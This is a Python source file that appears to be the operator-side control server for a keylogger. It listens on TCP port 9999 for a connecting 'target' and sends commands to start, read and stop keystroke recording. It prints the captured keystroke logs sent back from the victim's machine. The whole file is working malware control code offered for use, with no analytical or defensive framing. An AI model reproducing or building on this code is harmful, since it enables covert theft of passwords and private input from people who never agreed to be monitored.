import socket
import json

def show_banner():
    print("""
[ Keylogger Control Panel ]
Commands:
  - start_logger  → Start recording keystrokes
  - read_data     → Retrieve keylogger log content
  - stop_logger   → Stop and delete keylogger
  - exit          → Disconnect
""")

def send_command(target, command):
    try:
        target.send(json.dumps(command).encode())
    except Exception as e:
        print(f"[!] Failed to send command: {e}")

def main():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind(('0.0.0.0', 9999))  # Listen for incoming connections
    soc.listen(1)
    print("[*] Waiting for connection from target...")
    target, ip = soc.accept()
    print(f"[+] Connected to target: {ip}")
    show_banner()

    while True:
        try:
            command = input("keylogger>> ").strip()
            if not command:
                continue

            send_command(target, command)

            if command == "read_data":
                print("[*] Retrieving log data...")
                data = target.recv(4096).decode(errors="ignore")
                print("[LOG]\n" + data)
            elif command in ("exit", "quit"):
                break
        except Exception as e:
            print(f"An error occurred: {e}")
            break

    target.close()
    soc.close()

if __name__ == "__main__":
    main()
